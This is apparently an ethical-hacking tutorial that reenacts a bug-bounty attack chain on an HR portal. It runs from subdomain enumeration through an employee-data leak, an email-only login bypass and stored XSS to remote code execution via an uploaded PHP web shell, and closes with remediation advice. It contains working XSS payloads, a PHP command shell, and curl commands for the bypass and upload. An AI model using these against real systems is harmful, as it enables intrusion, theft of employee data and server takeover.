# Recon to RCE - A Cascade of Vulnerabilities

**🔴🔴🔴 WARNING: ETHICAL USE AND LEGAL COMPLIANCE REQUIRED 🔴🔴🔴**

This document provides a detailed walkthrough for educational purposes, simulating a scenario where initial reconnaissance leads to the discovery of multiple vulnerabilities including PII data leakage, authentication bypass, Cross-Site Scripting (XSS), and ultimately Remote Code Execution (RCE) via unrestricted file upload.

**YOU MUST ONLY APPLY THESE TECHNIQUES TO:**
1.  **Systems you OWN and have built for testing.**
2.  **Intentionally vulnerable applications in a controlled lab environment.**
3.  **Targets for which you have EXPLICIT, WRITTEN PERMISSION from the owner (e.g., official bug bounty programs, within defined scope).**

**UNAUTHORIZED ACCESS OR TESTING IS ILLEGAL AND UNETHICAL. YOU ARE RESPONSIBLE FOR YOUR ACTIONS.**

---

## Table of Contents
1.  [Objective & Scenario Overview](#1-objective--scenario-overview)
2.  [Prerequisites & Lab Setup (Conceptual)](#2-prerequisites--lab-setup-conceptual)
3.  [Phase 1: Reconnaissance - Subdomain Enumeration & Discovery](#3-phase-1-reconnaissance---subdomain-enumeration--discovery)
    *   [3.1. Subdomain Enumeration](#31-subdomain-enumeration)
    *   [3.2. Resolving Live Subdomains](#32-resolving-live-subdomains)
    *   [3.3. Initial PII Leak Discovery (`/teamlevel`)](#33-initial-pii-leak-discovery-teamlevel)
4.  [Phase 2: Deeper Enumeration & Authentication Bypass (`/hrms`)](#4-phase-2-deeper-enumeration--authentication-bypass-hrms)
    *   [4.1. Path Fuzzing & Discovery of `/hrms`](#41-path-fuzzing--discovery-of-hrms)
    *   [4.2. Authentication Bypass on `/hrms`](#42-authentication-bypass-on-hrms)
5.  [Phase 3: Post-Authentication Vulnerabilities](#5-phase-3-post-authentication-vulnerabilities)
    *   [5.1. Discovering Input Forms & Testing for XSS](#51-discovering-input-forms--testing-for-xss)
    *   [5.2. Identifying File Upload Functionality](#52-identifying-file-upload-functionality)
    *   [5.3. Exploiting Unrestricted File Upload for RCE](#53-exploiting-unrestricted-file-upload-for-rce)
6.  [Phase 4: Impact & Ethical Reporting](#6-phase-4-impact--ethical-reporting)
7.  [Remediation & Prevention Strategies](#7-remediation--prevention-strategies)
8.  [Conclusion](#8-conclusion)

---

## 1. Objective & Scenario Overview

*   **Objective:** To simulate and understand a multi-stage attack path where initial reconnaissance uncovers a series of increasingly critical vulnerabilities, demonstrating how seemingly separate issues can be chained for maximum impact.
*   **Scenario Simulated:**
    1.  Standard subdomain enumeration.
    2.  Discovery of a subdomain and a specific path (`/teamlevel`) leaking employee PII.
    3.  Further path fuzzing on the same subdomain reveals another sensitive path (`/hrms`).
    4.  An authentication bypass on `/hrms` allows access to a dashboard just by providing an employee's email (obtained from the previous PII leak).
    5.  The dashboard allows data modification and contains input fields vulnerable to Stored XSS.
    6.  The dashboard also has a file upload feature that lacks proper validation, allowing the upload of a web shell (e.g., PHP file), leading to Remote Code Execution (RCE).
*   **Ethical Context:** This entire process is to be performed **only on authorized targets in a lab environment.**

---

## 2. Prerequisites & Lab Setup (Conceptual)

To simulate this in a lab:

*   **Target Application (Vulnerable Lab Setup):**
    *   A custom web application (e.g., built with PHP, Python/Flask/Django, Node.js) that you can control.
    *   It needs an endpoint like `/teamlevel` that publicly lists (or makes easily guessable) employee details including names and email addresses.
    *   It needs another endpoint, say `/hrms`, with a login mechanism that is flawed: it should grant access if a valid employee email is provided, without checking a password or OTP.
    *   The `/hrms` dashboard, once accessed, should have:
        *   Input fields where data can be entered/modified, and these fields should be vulnerable to Stored XSS (i.e., not properly sanitizing user input before displaying it).
        *   A file upload functionality that does not restrict file types, allowing `.php` or other executable web shell extensions.
    *   The server hosting this application must be configured to execute PHP files if a PHP shell is used for RCE.
*   **Tools Environment (as per previous READMEs, including):**
    *   `subfinder`, `amass`, `assetfinder` (or alternatives).
    *   `alterx` (optional).
    *   `httpx`.
    *   `ffuf` (or other path fuzzer).
    *   Web Browser with Developer Tools.
    *   `curl`.
    *   A simple web shell (e.g., a one-liner PHP shell).
*   **Placeholders for this Guide:**
    ```bash
    # In your notes or a shell script for convenience
    export TARGET_DOMAIN="your-vulnerable-lab.com" # !!! REPLACE e.g., mymultivulnapp.local !!!
    # We will derive the SUBDOMAIN_OF_INTEREST from reconnaissance
    ```

---

## 3. Phase 1: Reconnaissance - Subdomain Enumeration & Discovery

### 3.1. Subdomain Enumeration
*   **Action:** Collect potential subdomains for `{$TARGET_DOMAIN}`.
*   **Code (Shell - Conceptual, same as previous examples):**
    ```bash
    # Ensure TARGET_DOMAIN is set
    echo "[INFO] Running Subfinder for ${TARGET_DOMAIN}..."
    # subfinder -d "${TARGET_DOMAIN}" -o "subfinder_${TARGET_DOMAIN}.txt" -silent
    echo "[INFO] Running Amass (passive) for ${TARGET_DOMAIN}..."
    # amass enum -passive -d "${TARGET_DOMAIN}" -o "amass_${TARGET_DOMAIN}.txt"
    echo "[INFO] Running Assetfinder for ${TARGET_DOMAIN}..."
    # echo "${TARGET_DOMAIN}" | assetfinder --subs-only > "assetfinder_${TARGET_DOMAIN}.txt"

    echo "[INFO] Combining and sorting unique subdomains..."
    # cat "subfinder_${TARGET_DOMAIN}.txt" "amass_${TARGET_DOMAIN}.txt" "assetfinder_${TARGET_DOMAIN}.txt" | sort -u > "all_subdomains_raw_${TARGET_DOMAIN}.txt"
    # For a lab, you might predefine the target subdomain:
    echo "hr-portal.${TARGET_DOMAIN}" > "all_subdomains_raw_${TARGET_DOMAIN}.txt" # Example
    export TARGET_SUBDOMAIN_LIST="all_subdomains_raw_${TARGET_DOMAIN}.txt"
    echo "[INFO] Subdomain list: ${TARGET_SUBDOMAIN_LIST}"
    ```

### 3.2. Resolving Live Subdomains
*   **Action:** Check which enumerated subdomains are live.
*   **Code (Shell - using `httpx`):**
    ```bash
    # Ensure TARGET_SUBDOMAIN_LIST is set
    if [ ! -f "${TARGET_SUBDOMAIN_LIST}" ]; then echo "[ERROR] Subdomain list not found."; exit 1; fi
    if ! command -v httpx &> /dev/null; then echo "[WARN] httpx not found."; exit 1; fi

    echo "[INFO] Probing live subdomains from ${TARGET_SUBDOMAIN_LIST}..."
    cat "${TARGET_SUBDOMAIN_LIST}" | httpx -silent -threads 20 -mc 200 -title -tech-detect -o "live_subdomains_200_${TARGET_DOMAIN}.txt"
    echo "[SUCCESS] Live subdomains (status 200) saved to live_subdomains_200_${TARGET_DOMAIN}.txt:"
    cat "live_subdomains_200_${TARGET_DOMAIN}.txt"
    ```
*   **Scenario Focus:** From this output, identify the subdomain you will be working with. Let's assume one is found: `hr-portal.your-vulnerable-lab.com`.
    ```bash
    export SUBDOMAIN_OF_INTEREST_URL=$(grep "hr-portal" "live_subdomains_200_${TARGET_DOMAIN}.txt" | head -n 1)
    # This might give http://hr-portal.your-vulnerable-lab.com or https://...
    # For simplicity, let's assume HTTP for lab unless specified.
    # Ensure it's just the base URL, e.g., http://hr-portal.your-vulnerable-lab.com
    export SUBDOMAIN_OF_INTEREST_URL=$(echo $SUBDOMAIN_OF_INTEREST_URL | awk -F/ '{print $1"//"$3}')
    echo "[CONFIRMED] Subdomain of interest URL set to: ${SUBDOMAIN_OF_INTEREST_URL}"
    ```

### 3.3. Initial PII Leak Discovery (`/teamlevel`)

The scenario states: "I found that subdomain’s endpoint `/teamlevel` is hosting the information of all its employees in a hierarchy format."

*   **Action:**
    1.  Manually browse to `{$SUBDOMAIN_OF_INTEREST_URL}/teamlevel`.
    2.  Observe the data. It should list employee names, emails, positions, etc.
*   **Code (Conceptual `curl` to fetch and look for PII indicators):**
    ```bash
    # Ensure SUBDOMAIN_OF_INTEREST_URL is set
    PII_LEAK_URL="${SUBDOMAIN_OF_INTEREST_URL}/teamlevel"

    echo "[INFO] Checking for PII leak at: ${PII_LEAK_URL}"
    # -k for self-signed certs if HTTPS
    curl -s -k -L "${PII_LEAK_URL}" -o "teamlevel_output.html"

    if [ -s "teamlevel_output.html" ]; then
        echo "[SUCCESS] Content fetched from ${PII_LEAK_URL}, saved to teamlevel_output.html."
        echo "    Manually review teamlevel_output.html for PII (names, emails, roles)."
        echo "    Example grep for emails:"
        grep -Eio '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' "teamlevel_output.html" | sort -u | tee "leaked_emails.txt"
        if [ -s "leaked_emails.txt" ]; then
            echo "[PII FOUND] Leaked email addresses saved to leaked_emails.txt. Sample:"
            head -n 3 "leaked_emails.txt"
            # Pick one email for the next step
            export TARGET_EMPLOYEE_EMAIL=$(head -n 1 "leaked_emails.txt")
            echo "[INFO] Using employee email for next steps: ${TARGET_EMPLOYEE_EMAIL}"
        else
            echo "[WARN] No emails automatically extracted. Review teamlevel_output.html manually."
        fi
    else
        echo "[ERROR] Could not fetch content from ${PII_LEAK_URL} or file is empty."
    fi
    ```
*   **Impact:** This is already a significant PII data leak.

---

## 4. Phase 2: Deeper Enumeration & Authentication Bypass (`/hrms`)

### 4.1. Path Fuzzing & Discovery of `/hrms`

"I started fuzzing the subdomain and found an interesting endpoint `/hrms`..."

*   **Action:** Use `ffuf` on `{$SUBDOMAIN_OF_INTEREST_URL}` to find more paths.
*   **Code (Shell - using `ffuf`):**
    ```bash
    # Ensure SUBDOMAIN_OF_INTEREST_URL and WORDLIST_PATH are set
    if [ -z "${SUBDOMAIN_OF_INTEREST_URL}" ] || [ -z "${WORDLIST_PATH}" ]; then echo "[ERROR] Required vars not set."; exit 1; fi
    if [ ! -f "${WORDLIST_PATH}" ]; then echo "[ERROR] Wordlist ${WORDLIST_PATH} not found."; exit 1; fi
    if ! command -v ffuf &> /dev/null; then echo "[WARN] ffuf not found."; exit 1; fi

    echo "[INFO] Fuzzing paths on ${SUBDOMAIN_OF_INTEREST_URL}..."
    ffuf -w "${WORDLIST_PATH}" -u "${SUBDOMAIN_OF_INTEREST_URL}/FUZZ" \
         -mc 200,301,302,401,403 -fc 404 -t 50 -c -k # -k for self-signed SSL if HTTPS
    ```
*   **Scenario Outcome:** The path `/hrms` is discovered (likely returning `200 OK` and showing a login form).
    ```bash
    export HRMS_LOGIN_URL="${SUBDOMAIN_OF_INTEREST_URL}/hrms"
    echo "[CONFIRMED] HRMS login URL found: ${HRMS_LOGIN_URL}"
    ```

### 4.2. Authentication Bypass on `/hrms`

"...which is asking for the employee’s email address to login/authorize. I entered an email ID and without any password or OTP, I logged into their dashboard..."

*   **Action:**
    1.  Navigate to `{$HRMS_LOGIN_URL}` in your browser.
    2.  It should present a form asking only for an email address.
    3.  Enter one of the emails obtained from the `/teamlevel` PII leak (e.g., `{$TARGET_EMPLOYEE_EMAIL}`).
    4.  Submit the form.
*   **Expected Result (Due to Vulnerability):** You are redirected to the HRMS dashboard without needing a password or OTP.
*   **Code (Conceptual `curl` to simulate the bypass - actual bypass logic is server-side):**
    This step is harder to fully automate with `curl` if it involves session cookies being set upon successful "login". Browser interaction or a Python script with `requests.Session()` would be better.
    ```bash
    # Ensure HRMS_LOGIN_URL and TARGET_EMPLOYEE_EMAIL are set
    # This curl command simulates submitting the email. The server's flawed logic does the bypass.
    # We assume the form field for email is named 'employee_email_input' (inspect HTML to find actual name)
    
    echo "[INFO] Attempting auth bypass on ${HRMS_LOGIN_URL} with email: ${TARGET_EMPLOYEE_EMAIL}"
    # -d for POST data, -L to follow redirects, -c to save cookies, -b to send cookies
    # -k for self-signed SSL
    # The exact POST request depends on the form structure. Inspect with DevTools.
    curl -s -k -L -X POST "${HRMS_LOGIN_URL}" \
         -c "hrms_cookies.txt" \
         -d "employee_email_input=${TARGET_EMPLOYEE_EMAIL}&submit_button=Login" \
         -o "hrms_dashboard_attempt.html"

    # Check if hrms_dashboard_attempt.html looks like a dashboard
    if grep -qiE 'dashboard|welcome|profile|settings' "hrms_dashboard_attempt.html"; then
        echo -e "\033[0;32m[SUCCESS?] Auth bypass likely successful! HRMS dashboard content in hrms_dashboard_attempt.html.\033[0m"
        echo "    Cookies saved in hrms_cookies.txt. Use these for subsequent requests if needed."
    else
        echo -e "\033[0;31m[FAILURE?] Auth bypass may have failed. Review hrms_dashboard_attempt.html.\033[0m"
    fi
    ```
    *   **Verification:** Open `hrms_dashboard_attempt.html` or manually perform in browser. You should see the dashboard. The story confirms: "I logged into their dashboard and was allowed to change the data available on it."

---

## 5. Phase 3: Post-Authentication Vulnerabilities

Now that you have access to the HRMS dashboard, explore it for more vulnerabilities.

### 5.1. Discovering Input Forms & Testing for XSS

"I started playing with input boxes and first thing I tried inputting a XSS payload in all forms and submit it. and BOOM"

*   **Action:**
    1.  Manually explore the HRMS dashboard in your browser (using the session from the bypass).
    2.  Identify all input fields, forms, text areas (e.g., profile update, comments, search boxes).
    3.  For each input field, try a simple Stored XSS payload like:
        *   `<script>alert('XSS-HRMS')</script>`
        *   `<img src=x onerror=alert('XSS-IMG-HRMS')>`
        *   `"><svg/onload=alert('XSS-SVG-HRMS')>`
    4.  Submit the form.
    5.  Navigate to the page where the submitted data is displayed. If an alert box with 'XSS-HRMS' (or similar) appears, Stored XSS is confirmed.
*   **Code (Conceptual - XSS testing is best done manually or with specialized tools/browser extensions):**
    ```
    # XSS Payloads
    # PAYLOAD1="<script>alert('XSS-HRMS-1')</script>"
    # PAYLOAD2="<img src=x onerror=alert('XSS-HRMS-2')>"
    # PAYLOAD3="\"><svg/onload=alert('XSS-HRMS-3')>"

    # You would:
    # 1. Find a form on the HRMS dashboard (e.g., update profile page).
    #    URL: ${SUBDOMAIN_OF_INTEREST_URL}/hrms/profile_edit.php
    #    Field name: 'user_bio'
    # 2. Craft a POST request with the XSS payload in the 'user_bio' field.
    #    Use curl with the saved cookies (hrms_cookies.txt from auth bypass).
    #    curl -s -k -L -X POST "${SUBDOMAIN_OF_INTEREST_URL}/hrms/profile_update_action.php" \
    #         -b "hrms_cookies.txt" \
    #         -d "user_bio=<script>alert('XSS-HRMS-BIO')</script>&other_field=value"
    # 3. Then navigate to the page where the bio is displayed:
    #    curl -s -k -L "${SUBDOMAIN_OF_INTEREST_URL}/hrms/view_profile.php?id=some_id" \
    #         -b "hrms_cookies.txt" \
    #         | grep "<script>alert('XSS-HRMS-BIO')</script>"
    #    Or, more simply, view it in the browser after submitting to see if the alert pops.
    ```
*   **Educational Note:** If the XSS payload executes, it means the application isn't properly sanitizing user input before storing and displaying it.

### 5.2. Identifying File Upload Functionality

"I logged into the dashboard and found file upload functionality."

*   **Action:** Manually explore the HRMS dashboard. Look for sections like:
    *   "Upload Profile Picture"
    *   "Attach Document"
    *   "Import Data"
    *   Any feature that involves uploading a file.

### 5.3. Exploiting Unrestricted File Upload for RCE

"I have tried to upload a php file and BOOM" (implies success)

*   **Action:**
    1.  **Create a Simple Web Shell:**
        *   PHP Shell (e.g., `shell.php`):
            ```php
            <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?>
            ```
            Or even simpler for a quick test: `<?php phpinfo(); ?>`
    2.  **Attempt Upload:** Use the identified file upload form on the HRMS dashboard to upload your `shell.php`.
    3.  **Identify Upload Path:** If the upload is successful, the application might:
        *   Display the path to the uploaded file.
        *   Have a predictable upload directory (e.g., `/hrms/uploads/`, `/hrms/files/`). You might need to guess or find this through other means (directory fuzzing *after* login, source code if available).
    4.  **Access the Shell:** Navigate to the URL of the uploaded shell in your browser.
        *   Example: `{$SUBDOMAIN_OF_INTEREST_URL}/hrms/uploads/shell.php`
    5.  **Execute Commands:**
        *   If `phpinfo()` was uploaded: You should see the PHP information page.
        *   If the command shell was uploaded:
            `{$SUBDOMAIN_OF_INTEREST_URL}/hrms/uploads/shell.php?cmd=whoami`
            `{$SUBDOMAIN_OF_INTEREST_URL}/hrms/uploads/shell.php?cmd=ls%20-la`
*   **Code (Conceptual `curl` to upload - actual upload forms are complex and usually require multipart/form-data):**
    Uploading files with `curl` accurately requires knowing the form field names and using `-F`. It's often easier to do this manually through the browser or with a tool like Burp Suite to capture and modify the request.
    ```bash
    # Create shell.php
    # echo '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>' > shell.php

    # This is highly conceptual and depends on the exact form structure.
    # UPLOAD_FORM_ACTION_URL="${SUBDOMAIN_OF_INTEREST_URL}/hrms/perform_upload.php"
    # FILE_UPLOAD_FIELD_NAME="userfile_to_upload" # Inspect HTML to find this

    # echo "[INFO] Attempting to upload shell.php to ${UPLOAD_FORM_ACTION_URL}"
    # curl -s -k -L -X POST "${UPLOAD_FORM_ACTION_URL}" \
    #      -b "hrms_cookies.txt" \ # Use session cookies from auth bypass
    #      -F "${FILE_UPLOAD_FIELD_NAME}=@shell.php;filename=shell.php" \
    #      -o "upload_response.html"

    # Assume upload path is /hrms/uploads/
    # UPLOADED_SHELL_URL="${SUBDOMAIN_OF_INTEREST_URL}/hrms/uploads/shell.php"
    # echo "[INFO] Checking uploaded shell at ${UPLOADED_SHELL_URL}"
    # curl -s -k -L "${UPLOADED_SHELL_URL}?cmd=whoami"
    ```
*   **Result:** If commands execute, you have achieved Remote Code Execution (RCE).

---

## 6. Phase 4: Impact & Ethical Reporting

If this were an authorized test:

*   **Document All Findings:**
    1.  PII Leak via `/teamlevel` (emails, names, etc.).
    2.  Authentication Bypass on `/hrms` using leaked emails.
    3.  Stored XSS vulnerability within the `/hrms` dashboard (specify affected forms/fields).
    4.  Unrestricted File Upload leading to RCE on `/hrms` (specify upload functionality and path to shell).
*   **Evidence:** Screenshots, `curl` commands, payloads, paths to uploaded shells, output of commands via RCE.
*   **Impact Assessment:** This chain demonstrates multiple critical risks:
    *   Massive PII data exposure.
    *   Complete compromise of the HRMS system due to auth bypass.
    *   Ability to deface or manipulate HRMS data.
    *   Potential for attackers to steal session cookies of other HRMS users via XSS.
    *   Full server compromise via RCE, potentially leading to pivoting into the internal network.
*   **Report Immediately and Responsibly:** Provide a clear, detailed report to the organization.

---

## 7. Remediation & Prevention Strategies

*   **PII Leak (`/teamlevel`):**
    *   Remove public access to endpoints that list sensitive employee data.
    *   Implement strong authentication and authorization for any access to PII.
*   **Authentication Bypass (`/hrms`):**
    *   Implement proper authentication: Require strong passwords and ideally Multi-Factor Authentication (MFA).
    *   Validate credentials server-side. Do not rely solely on an email address for authorization.
*   **Stored XSS:**
    *   **Output Encoding:** Encode all user-supplied data appropriately before rendering it in HTML, based on the context (HTML body, HTML attribute, JavaScript, CSS). Use libraries like OWASP ESAPI.
    *   **Input Sanitization/Validation:** While output encoding is primary, also validate and sanitize input to reject malicious patterns.
    *   **Content Security Policy (CSP):** Implement a strong CSP to restrict what sources scripts can be loaded from and reduce XSS impact.
*   **Unrestricted File Upload (RCE):**
    *   **Whitelist Allowed File Types:** Only allow specific, safe file extensions (e.g., `.jpg`, `.png`, `.pdf`, `.txt`). Deny all others.
    *   **Validate File Content (MIME Type & Magic Bytes):** Don't rely solely on the extension. Check the actual file type.
    *   **Rename Uploaded Files:** Store uploaded files with a random, system-generated filename and without their original extension if possible, or with a safe, non-executable extension.
    *   **Serve from a Non-Executable Path/Domain:** Store user-uploaded files in a directory that the web server is configured *not* to execute scripts from (e.g., outside the web root, or on a separate domain for user content with strict permissions).
    *   **Scan Uploaded Files:** Use antivirus/anti-malware scanners.
    *   **Limit File Size:** Prevent denial-of-service via large file uploads.
*   **General Security Practices:**
    *   Regular security code reviews.
    *   Automated security testing (SAST, DAST).
    *   Penetration testing.
    *   Principle of least privilege.
    *   Keep software and dependencies updated.

---

## 8. Conclusion

This educational simulation illustrates a dangerous chain reaction of vulnerabilities. It starts with a seemingly simple PII leak through reconnaissance and progressively escalates to full server compromise (RCE). This underscores that even one "medium" or "low" risk vulnerability can be a stepping stone for attackers if other weaknesses exist. A defense-in-depth approach is crucial.

**Always practice ethical hacking responsibly and within legal boundaries. Understanding these complex attack chains is vital for building secure applications and robust defenses.**

---
**Follow @muneebwanee for more Hacking Tutorials**
